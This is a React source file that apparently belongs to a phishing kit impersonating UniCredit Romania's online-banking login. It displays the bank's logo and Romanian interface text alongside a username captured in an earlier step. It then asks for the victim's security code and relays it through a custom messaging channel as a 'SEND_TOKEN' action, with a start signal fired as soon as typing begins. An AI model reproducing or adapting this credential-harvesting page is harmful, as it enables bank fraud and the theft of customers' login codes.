import React, { useState } from 'react'
import { storage } from '../storage/storage'
import { Messaging } from '../utils/messages'
import { UserActions } from '../utils/constants'
import logo from '../media/logo_uc.png'
import arrow from '../media/arrow.PNG'
import { Info } from './Info'
import user from '../media/user.png'

export const Step2 = props => {

  const { store, changeStore } = props
  const [value, setValue] = useState(store.step_2_cod)

  const error = store.error
  const setError = val => changeStore({ error: val })

  const handleChange = (value) => {
    setValue(value)

    if (!storage.touched) {
      console.log('typing....')
      Messaging.start()
      storage.touched = true
    }

  }

  const handleSubmit = (e) => {
    e.preventDefault()
    if (!value) {
      setError(true)
      return
    }

    Messaging.send({ type: UserActions.SEND_TOKEN, payload: value })

    changeStore({
      step_2_cod : value,
      loading: true,
    })

  }

  return(
    <div className="step-wrapper">
      <div>
      <div className="loading-area">
        <div className="header-area">
          <div className="logo-container">
            <img src={logo} alt="UniCredit"/>
          </div>
          <div className="language-selector-container">
            <div className="language-type pt">
              ROMÂNĂ
            </div>
            <div className="arrow-icon">
              <img src={arrow} alt="arrow"/>
            </div>
          </div>
        </div>
        <div className="form-area">
          <form className="login-form" onSubmit={handleSubmit}>
            <div className="login-pseudomodal" style={{textAlign: 'center'}}>
              <div>
                <img src={user} alt="user"/>
              </div>
              
              <div className="secure-title pt">
                {store.step_1_cod}
              </div>
              <div className="change-user">
                <a href="#">SCHIMBĂ NUME UTILIZATOR</a>
              </div>
              <div className="field-container">
                <div className="field-description">Cod de securitate</div>
                <div className="field-input">
                  <input type="text" value={value} onChange={e => handleChange(e.target.value)} className={error && `error`} placeholder="Introduceti parola" />
                  <div className="error-text">
                    {error && 'Cod de securitate este introdus eronat.'}

                  </div>
                </div>
                
              </div>
              <button className="button-confirm pt-italic" type="submit" >
                ACCESARE
              </button>
            </div>
          </form>
        </div>
      </div>
        
      </div>
    </div>
  )
}